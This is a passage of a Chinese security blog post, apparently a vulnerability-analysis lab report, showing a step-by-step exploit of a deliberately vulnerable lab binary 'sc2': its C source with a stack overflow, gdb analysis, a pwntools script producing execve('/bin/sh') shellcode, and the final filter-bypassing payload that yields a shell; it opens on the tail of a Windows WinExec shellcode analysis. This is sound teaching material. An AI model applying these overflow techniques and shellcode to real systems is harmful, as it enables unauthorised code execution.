edx,esp</span><br><span class="line">inc		eax</span><br><span class="line">push	eax</span><br><span class="line">push	edx</span><br><span class="line">call	ebp</span><br><span class="line">push	2A60A677h</span><br><span class="line">call	00b40003</span><br><span class="line">push	eax</span><br><span class="line">call	ebp							//调用ebp存储的地址0x7c8623ad上存储的winExec函数</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="根据实验题目sc2，撰写详细的解题过程"><a href="#根据实验题目sc2，撰写详细的解题过程" class="headerlink" title="根据实验题目sc2，撰写详细的解题过程"></a>根据实验题目sc2，撰写详细的解题过程</h2><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
+<li>操作系统：Kali Linux</li>
+<li>工具：pwntools、gdb</li>
+</ul>
+<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li><p>函数源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Discription:</span></span><br><span class="line"><span class="comment">   [vul]--&gt; stack overflow vulnerability</span></span><br><span class="line"><span class="comment">   [solve clue]--&gt; use bof to execute shellcode in the stack</span></span><br><span class="line"><span class="comment">   [writer]--&gt; carter   2018.5.20</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> alarm_time 500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> filter_num 2</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">	alarm(alarm_time);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">egg</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//__asm__ (&quot;jmp *-0x30(%rsp);&quot;);</span></span><br><span class="line">	__asm__(<span class="string">&quot;sub rsp,0x30;jmp rsp;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_input</span><span class="params">(<span class="type">char</span> *ss)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> filter[<span class="number">8</span>] = &#123;<span class="string">&#x27;\xaa&#x27;</span>,<span class="string">&#x27;\xbb&#x27;</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filter_num;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">strlen</span>(ss);j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ss[j]==filter[i])</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bof</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> content[<span class="number">48</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Input your content: &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,content,<span class="number">60</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(content)&gt;=<span class="number">48</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Detect bof!&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!check_input(content))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	init();</span><br><span class="line">	bof();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>源代码分析</p>
+<ol>
+<li>main函数调用init函数和bof函数；</li>
+<li>init函数的功能是初始化，设置了输入输出流和程序限定时间；</li>
+<li>bof函数：<ol>
+<li>声明一个长度位48的字符串数组；</li>
+<li>输出字符串<code>Input your content: </code>；</li>
+<li>调用read函数，读取60个字符，放入字符串数组content中；</li>
+<li>判断字符串数组content的长度是否大于48，如果超过48，则输出<code>Detect bof!</code>，并且异常退出；</li>
+<li>调用check_input函数，检查字符串中是否包含<code>\xaa</code>、<code>\xbb</code>，如果包含，则异常退出；</li>
+</ol>
+</li>
+<li>egg函数通过降低地址扩展栈空间；</li>
+</ol>
+</li>
+<li><p>漏洞利用</p>
+<p>字符串数组content长度为48，输入的字符数为60，造成字符串溢出，可以使用<code>0x00</code>绕过限制48个字符的判断；</p>
+</li>
+<li><p>分析过程</p>
+<ol>
+<li><p>使用checksec工具查看二进制代码的保护，Stack没有保护措施，可以利用栈溢出攻击，NX显示disabled，有执行栈上代码的权限；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570784221146.png" alt="1570784221146"></p>
+</li>
+<li><p>使用gdb调试sc2；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570786458697.png" alt="1570786458697"></p>
+</li>
+<li><p>由于在bof函数中存在输入点，因此在bof函数入口点设置断点，查看栈信息得到栈基址地址为<code>0x7fffffffe0f0  </code>，栈顶地址为<code>0x7fffffffe0e8</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868262705.png" alt="1570868262705"></p>
+<p>查看字符串溢出点的位置，构造简单的shellcode，其中使用<code>\x00</code>绕过长度检测；</p>
+</li>
+<li><p>```shell<br>\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![1570868550702](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868550702.png)</span><br><span class="line"></span><br><span class="line">5. 在gdb中执行该shellcode，出现错误，程序试图访问`0x59585756`这个地址，而该地址正是上述shellcode中的内容，在该位置填入目的地址，即可跳转到相应的地址执行代码；</span><br><span class="line"></span><br><span class="line">   ![1570868725103](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868725103.png)</span><br><span class="line"></span><br><span class="line">6. 查看栈信息发现栈基址地址rbp被shellcode中的内容`\x48\x49\x50\x51\x52\x53\x54\x55`覆盖，栈顶地址rsp编变成了`0x7fffffffe1a0`；</span><br><span class="line"></span><br><span class="line">   ![1570868795483](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868795483.png)</span><br><span class="line"></span><br><span class="line">7. 查看栈中内存情况发现输入的shellcode从地址`0x7fffffffeb0`开始存储；</span><br><span class="line"></span><br><span class="line">   ![1570868967865](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570868967865.png)</span><br><span class="line"></span><br><span class="line">8. 由于只能修改地址的低8位, 不能修改地址的高8位，显然直接覆盖返回地址来到达相应的栈空间是不可能的，只能通过跳板指令到达相应的栈地址，搜索跳板指令，发现一个`jmp rsp`指令；</span><br><span class="line"></span><br><span class="line">   ![1570803761072](https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570803761072.png)</span><br><span class="line"></span><br><span class="line">9. 根据程序源码，这个`jmp rsp`仅存在egg函数中；</span><br><span class="line"></span><br><span class="line">   ```c</span><br><span class="line">   void egg()</span><br><span class="line">   &#123;</span><br><span class="line">   	//__asm__ (&quot;jmp *-0x30(%rsp);&quot;);</span><br><span class="line">   	__asm__(&quot;sub rsp,0x30;jmp rsp;&quot;);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码将rsp降低了0x30，到地址<code>0x7fffffffe170</code>处，可以设计shellcode将其覆盖；</p>
+</li>
+<li><p>egg函数地址为<code>0x400798</code>，<code>sub 0x30,rsp</code>地址为<code>0x40079c</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570863363546.png" alt="1570863363546"></p>
+</li>
+<li><p>利用pwntools的工具shellcraft生成shellcode，生成shellcode的代码shellcode.py如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">payload = asm(shellcraft.amd64.linux.execve(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))	<span class="comment">#可执行ls/cd等指令</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;shellcode.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></li>
+<li><p>执行shellcode.py得到十六机制编码如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570808000533.png" alt="1570808000533"></p>
+</li>
+<li><p>由于需要绕过只能输入48个字符串和不能出现<code>0xaa</code>、<code>0xbb</code>，对shellcode进一步完善如下；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05\x90\x90\x90\x9c\x07\x40\x00</span><br></pre></td></tr></table></figure>
+
+<p>其中s<code>\x00</code>是绕过长度检查位于<code>0x7ffffffe0b0</code>处，<code>\x90</code>用于长度填充，末尾的<code>\x9c\x07\x04\x00</code>是<code>sub 0x30,rsp</code>的地址</p>
+</li>
+<li><p>输入命令<code>cat shellcode - | ./sc2</code>运行shellcode，可执行<code>ls</code>、<code>cd</code>等指令；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1570869598910.png" alt="1570869598910"></p>
+</li>
+</ol>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>李钰璕
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://leeyuxun.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80.html" title="漏洞分析技术实验一">https://leeyuxun.github.io/漏洞分析技术实验一.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-cn" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/shellcode/" rel="tag"><i class="fa fa-tag"></i> shellcode</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/GDB%E5%91%BD%E4%BB%A4%E7%AE%80%E4%BB%8B.html" rel="prev" title="GDB命令简介">
+      <i class="fa fa-chevron-left"></i> GDB命令简介
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E4%B8%89.html" rel="next" title="操作系统内核-实验三">
+      操作系统内核-实验三 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="nav-number">1.</span> <span class="nav-text">实验目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9%E8%A6%81%E6%B1%82"><span class="nav-number">2.</span> <span class="nav-text">实验内容要求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">3.</span> <span class="nav-text">实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90sc1-bin%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="nav-number">3.1.</span> <span class="nav-text">分析sc1.bin弹出计算器的漏洞利用详细过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">3.1.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.1.2.</span> <span class="nav-text">步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E5%AE%9E%E9%AA%8C%E9%A2%98%E7%9B%AEsc2%EF%BC%8C%E6%92%B0%E5%86%99%E8%AF%A6%E7%BB%86%E7%9A%84%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">根据实验题目sc2，撰写详细的解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">步骤</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">安全学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">89</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">115</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
